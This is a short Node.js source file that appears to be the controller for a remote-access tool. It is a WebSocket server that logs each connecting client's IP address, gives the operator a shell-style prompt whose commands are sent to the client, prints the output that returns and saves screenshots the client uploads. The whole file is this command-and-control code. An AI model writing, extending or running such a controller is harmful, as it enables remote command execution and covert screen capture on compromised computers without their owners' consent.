
const WebSocket = require('ws');
const colors = require('colors');
const prompt = require('prompt');
const detectCharacterEncoding = require('detect-character-encoding');
require('events').EventEmitter.setMaxListeners = 1;
var next = "";
prompt.start();
var workingDir = "";
const wss = new WebSocket.Server({ port: 4422 });

wss.on('connection', function connection(ws) {
	console.log("[".white + "+".blue + "] Connected to client : ".white + ws._socket.remoteAddress.replace("::ffff:","").underline.green + " !");
	ws.on('message', function incoming(message) {
    
    if(next == "screenshot"){
		next = "";
		var base64Data = message.replace(/^data:image\/png;base64,/, "");

		require("fs").writeFile("screenshots/"+Date.now()+".png", base64Data, 'base64', function(err) {
			console.log(err);
		});
    }
    else if(message.startsWith("hello")){
    	workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
    	prompt.get([{"description":workingDir.bold.white + "># ".bold.red}], function (err, result) {
			ws.send(result.question);
		});
    }else if(message.startsWith("##finish##")){
 		ws.send("#pwd");
    }
    else if(message == "##SCREENSHOT##"){
		next = "screenshot";
    }else{
		
		console.log(message.grey);
    }

	});

	ws.on('close', function(reasonCode, description) {
		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
	});

});
